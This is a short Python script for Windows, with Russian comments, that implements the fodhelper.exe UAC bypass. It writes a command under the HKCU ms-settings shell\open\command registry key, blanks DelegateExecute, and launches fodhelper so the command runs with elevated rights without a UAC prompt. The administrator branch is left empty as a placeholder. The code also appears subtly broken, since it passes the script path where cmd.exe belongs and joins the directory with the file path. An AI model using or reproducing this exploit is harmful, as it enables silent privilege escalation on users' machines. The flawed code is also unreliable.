import os
import sys
import ctypes
import winreg
import subprocess

script_path = os.path.abspath(sys.argv[0])

CMD = script_path
FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD = "python"
REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def create_reg_key(key, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise


def bypass_uac(cmd):
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
    except WindowsError:
        raise


def execute():
    global os, sys, subprocess  # делаем переменные глобальными
    if not is_running_as_admin():
        try:
            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)
            os.system(FOD_HELPER)
            sys.exit(0)
        except WindowsError:
            sys.exit(1)
    else:
        pass # код который выполняется если запущен как администратор

if __name__ == '__main__':
    execute()